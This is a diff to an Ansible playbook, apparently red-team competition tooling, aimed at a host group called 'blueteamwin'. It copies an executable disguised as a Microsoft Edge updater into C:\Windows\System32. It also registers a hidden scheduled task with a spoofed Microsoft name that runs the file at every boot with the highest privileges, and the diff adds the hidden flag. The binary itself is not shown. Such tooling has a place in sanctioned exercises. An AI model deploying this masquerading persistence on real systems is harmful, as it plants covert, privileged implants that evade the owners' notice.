@@ -3,27 +3,43 @@
   hosts: blueteamwin
   gather_facts: yes
   vars:
-    updater_exe: "~/infrastructure/redteam/FlashFlood/MicrosoftEdgeV1_2Updater.exe"
-    dest_path: "C:\\Windows\\System32\\{{ updater_exe }}"
-    task_name: "Microsoft Edge Client Update"
+    source_path: "~/infrastructure/redteam/FlashFlood/MicrosoftEdgeV1_2Updater.exe"
+    dest_path: "C:\\Windows\\System32"
+    task_name: "MicrosoftEdgeClientUpdate"
     task_description: "Automatically updates Microsoft Edge Components"
   tasks:
+    - name: Download Visual C++ Redistributable
+      win_get_url:
+        url: "https://aka.ms/vs/17/release/vc_redist.x64.exe"
+        dest: "C:\\vc_redist.x64.exe"
+
+    - name: Install Visual C++ Redistributable
+      win_shell: "C:\\vc_redist.x64.exe /quiet /install"
+      args:
+        executable: cmd
+      register: vc_redist_install
+      changed_when: vc_redist_install.rc == 0
+
+    - name: Cleanup installation file
+      win_file:
+        path: "C:\\vc_redist.x64.exe"
+        state: absent
+
     - name: Copy Microsoft Edge Updater to Windows hosts
       win_copy:
-        src: "{{ updater_exe }}"
+        src: "{{ source_path }}"
         dest: "{{ dest_path }}"
-      when: updater_exe is defined
 
     - name: Create scheduled task to run updater on startup with highest privileges
       win_scheduled_task:
         name: "{{ task_name }}"
         description: "{{ task_description }}"
         actions:
-          - path: "{{ dest_path }}"
+          - path: "{{ dest_path }}\\MicrosoftEdgeV1_2Updater.exe"
         triggers:
           - type: boot
         start_when_available: yes
-        force: yes
-        level: highest
+        hidden: true
+        run_level: highest
         enabled: yes
         state: present
